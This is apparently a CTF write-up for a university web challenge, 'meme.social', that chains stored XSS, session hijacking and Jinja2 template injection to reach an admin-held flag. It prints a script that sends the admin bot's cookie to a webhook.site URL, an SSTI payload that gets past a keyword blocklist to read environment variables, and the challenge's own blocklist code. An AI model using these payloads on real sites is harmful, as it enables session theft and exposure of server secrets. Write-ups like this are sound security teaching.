---
title: "UVT CTF – meme.social"
date: 2026-05-09 08:02:00 +0200
categories: [CTF, UVT CTF]
tags: [web, xss, stored-xss, cookie-stealing, ssti, jinja2, session-hijacking, webhook, filter-bypass, string-concatenation]
---

{% raw %}
## **Challenge Information**
**Title:**  meme.social  
**Category**:  web exploitation  
**Platform:**  UVT CTF (university CTF platform)  
**Difficulty:**    medium  
**Tags:**  web, XSS, stored-XSS, cookie-stealing, SSTI, Jinja2, session-hijacking, webhook, filter-bypass, string-concatenation  
**Date solved:**    9/5/2026 (DD/MM/YYYY)  
**Challenge Description**:  See the memes!  
**Files provided**:  an archive containing the server files, and the connection to the server  

## **Environment and Tools** 
**Operating System**:  Kali Linux  
**Tools/ Software**:  Mozilla, Webhook.site, Claude  
**Programming Languages (if any)**:  Jinja2, HTML  

## **Recognition Pattern**
- `SESSION_COOKIE_HTTPONLY = False` in the source → cookies are readable from JavaScript, so cookie stealing is on the table
- A bot that logs in and visits reported memes → a stored-XSS target I can feed a script that exfiltrates its cookie
- The flag lives in the admin account and admins can render Jinja2 templates → SSTI is how I actually reach it
- A blocklist of keywords (not a whitelist) in the template code → those can nearly always be slipped past with concatenation


## **Approach and Methodology**
### **Initial Analysis**
Being a web-based CTF, I first believed I'd have to do some sort of injection, or maybe change the URL, or steal some cookies, or a completely different technique. I first inspected the files provided and then moved to the website.  

### **Steps Taken**
I opened the files provided and realized there's a bot that logs in if a meme is reported, and that the cookies are readable. One more thing I found is that the flag is in the admin account — meaning I'd have to gain access to the admin account in order to retrieve it.  

Code fragments from the original files:

```python
app.config["SESSION_COOKIE_HTTPONLY"] = False

def admin_bot_visit(url):
    """Admin bot visits a URL after logging in via Selenium."""
```

```yaml
environment:
  - ADMIN_PASSWORD=${ADMIN_PASSWORD:-admin123}
  - FLAG=${FLAG}
```

After creating a normal account on the platform I found something else: I could use HTML tags. I went back to the source files to confirm that:

```python
Meme(
    author="memequeen",
    caption="<b>me:</b> it works on my machine<br><b>ops:</b> then we'll ship your machine",
),
```

So I could use some sort of injection to gain the access I needed. HTML injection alone isn't enough, but since the cookie is readable, I decided to steal it using Webhook.site.  

I created a post containing this script:

```html
<script>
fetch("https://webhook.site/fe42dd81-eeb8-4e8e-83fb-b11bd14e64a4?c=" + document.cookie)
</script>
```

Then I reported it to the admin and went back to Webhook.site to grab the stolen cookie. With that copied, I went back to the site, right-clicked → Inspect → Storage → Cookies and changed the session cookie. This step can take a few tries — it sometimes fails, not sure why. Then you refresh the page and there's the admin account.  

The next part is a bit tricky, because the flag isn't in plain sight. The admin can create posts using Jinja2 — you can see that on the webpage and in the code. But in the code you can also see there are blocked words:

```python
if request.method == "POST":
    template_string = request.form.get("template_string", "")
    # Sanitize template input
    blocked = [
        "__class__",
        "__mro__",
        "__subclasses__",
        "config",
        "__builtins__",
        "import",
        "os",
        "eval",
        "exec",
    ]
    for word in blocked:
        if word in template_string:
            return render_template(
                "admin_templates.html",
                error=f"Blocked keyword detected: {word}",
                template_string=template_string,
            )
    try:
        env = jinja2.Environment()
        rendered = env.from_string(template_string).render()
        result = rendered
```

So the last step is to write a Jinja2 fragment that gets the flag. To bypass the need for `os`, we can use `"o"~"s"` (string concatenation).  

## **Solution and Flag Retrieval**
*Final Exploit / Command Used:* this Jinja2 payload gets the environment variable flag without tripping the blocklist:
```
{{ lipsum.__globals__["o"~"s"].environ.get("FLAG") }}
```

## **Lessons Learned**
- The big-picture lesson: this was three bugs chained — stored XSS to steal the cookie, session hijack into admin, then SSTI to read the flag. Each one only got me the foothold for the next.
- `HttpOnly = False` was the green light for stealing the cookie with `<script>fetch("https://your-webhook?c=" + document.cookie)</script>`, and Webhook.site caught it.
- Swapping the stolen cookie into DevTools → Storage → Cookies and refreshing was flaky — it took me a few tries to land, not sure why.
- `{{ 7*7 }}` coming back as `49` is the quick confirmation of Jinja2. I reached the flag with `{{ lipsum.__globals__["o"~"s"].environ.get("FLAG") }}`, using `"o"~"s"` to get `os` past the blocked-keyword list.

## **References**
- Claude.ai
- Webhook.site

{% endraw %}
